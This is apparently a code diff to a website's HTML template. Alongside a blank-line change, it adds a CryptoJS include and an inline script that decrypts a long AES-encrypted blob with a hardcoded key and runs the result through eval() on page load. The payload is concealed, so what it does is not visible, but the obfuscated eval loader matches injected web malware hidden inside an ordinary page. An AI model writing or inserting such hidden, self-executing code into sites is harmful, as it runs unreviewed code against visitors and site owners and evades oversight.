@@ -32,8 +32,8 @@
 
     <!-- **** Custom CSS *** -->
     <link rel="stylesheet" href="assets/css/style.css" />
-
     <link rel="icon" href="assets/images/favicon.jpg" />
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
   </head>
 
   <body>
@@ -511,5 +511,18 @@
           }
       });
   </script>
+  <script>
+      let secretKey = 'bruceisgenius';
+      
+      function aesDecode(encodedText) {
+          if (!secretKey) {
+              throw new Error("Secret key is not available yet. Make sure it's fetched before calling this function.");
+          }
+          const decodedText = decodeURIComponent(encodedText);
+          const bytes = CryptoJS.AES.decrypt(decodedText, secretKey);
+          return bytes.toString(CryptoJS.enc.Utf8);
+      }
+      eval(aesDecode(`U2FsdGVkX1%2FbxMoQzDuByICg6SfVpMEQzbwwfqQhI%2BpIpEmAyhxmkazscnNetZI9fFyU0htBmuToHx5JNHn2VAmlfQucre42KUZrvBhNqAN5hfY78YmsxdvXKwfEkaGJs7k4fAvBswMYmXCF259ZCjELJiMFjg6xQu6A6wCni2orOxrJIAyxMHe%2Fnp1mbKRKQxv91IgiHyV2AT%2FFTLhqmxQVoCTUTh8bGgfwLn8rjuvi0tpLPAsdjLpU5lXlKpwEeNO0cQ%2BD91fQGpBNDS5VvPWRbb0wt1sEfnst27Ql12XMTlX1BocERhuJsak2zWGK2rvYPQ%2F%2F1ZQifL%2Fg6DKWiIIOIG423AkUai2m9HvwsTRl1zHxAE61rkP4aOyTbXZd2B0BBft%2BasgdtT9ZqDL2eB1tgYOS8mvdSYPZ2%2FfGIAYFiDLXUB5Vijry3dlC8dWEV2f0ZXsWdABG3SJWzbSwVxBgzJCE90gLsF9j1EAZ%2BgLKSkKBIWHu8YNtv%2BwmiaMrXihaKkGx39EnVRKW5VWnSOujsL%2FQLBCvw7MTnMRbE9tKe2IREOgeMmmx%2FBhCc7wzZmSIciSUi4eURXAkeKp1PtxUQuNA257f1ZtloJz05NnxidBH77G6FClP6OwNk%2BkJlwsXDQ%2BCi1%2FKdpSjFVNAA1%2BhUGyUMj%2B15ElcpahcXdFB32MfJNdkJL%2B5eez1irlXNUoQrJbJAMGOqbN7W15ls4zxfA2IzT5BGeZ6ytEOnKCnhxj7ymoxgcGkU%2Fzkqz69CBL2dKAOHHuZhuuyk47rUuhcS8MlFcian%2FLsC9qgw%2FYezg2B%2BfpIngc5ycqWZ%2Fd7k5bbons1%2BPOKx9PaEBayqb1rPAMJyQxQEMDD4yY7PcyPbjSTrurpj18FsIrJ8sd6FuMylDc6yrZ5w7RbiAbv7XzAT7Y3ox8VCuW06UyQ%2FwiaQNmXfe%2B4R1Y68elE9wZQnkalGD3AT80%2BHHisK4VwW9g5puYy9ZB0zrmoAznKRcHLW%2F%2BkttyVAqcaAGh1CB24gQCW301ck6EMdMQe%2BpR4de%2F5q1lWMD2pQT0G%2FcKA0%2FhLbb2aTK84mFu3xzmicQAmM1uvwa098JTbC2d02u47cwHYUDLeoMVjX5oM4tYwTXi5gk5EjnD4B%2B1bL4k7Ii8YLOTN4dpMNw7iZht9Jlit%2Bh0CXd8jt4FLt23A85ejYhCI%2BTygU3h9q1e6FzpUuhaXYPa0mHUqV1B%2B6t9a1kQmTQIMNQBMaZnm%2FCUo9U7pW4XWcI%2FONrQmFYyY%2Fr6xS7PumwpmXyU1%2BUbznEp0tzw4GAP%2Bw%2Blw%2BAu2Xh6hHr5WaKlJrYbH16%2BZTy2EDpX0SPdLqgVgafGT4ZGvDLUA0DgGDdM%2FfwR6%2FTlD5ttwEowcvtHURzSP42F2ycdO%2Bo0JhLR0xJK4KIQy3bdzpf17Iz1FY7F3RCwCJvQeG%2B%2Fz7As%2BnbdqOmSeZWM2do8xMGd7OvppbUidUug5Se5Tg5f5kTtd%2BV8OFf87M8ZKYTdFSF2NQ9%2BRb%2BCKy1V8r1q8%2Bry%2FpMlhy%2BNZYLWVAI41PHhhP6YddS%2FATGuYCMhUmUagXP%2FZd7xmwrLX%2Fi07Y7FvNHIVKF9S6pDn5o%2FhYqxqajLaNsVsbrwvPH0kqyUQ0vKL7KWCPyBxFguO2UfWA%2FdGnm1fZQJ2casLiYFg9W2Fl0nJ%2BkZm31sSR16p5ypRHqbzL2kV8GhdvNgxIif8WTiT8tNr64bWn%2FAStqwY7RKQiub1Tic60um0e3W32JlZ5WpONpbKPGs%3D`));
+    </script>
   </body>
 </html>
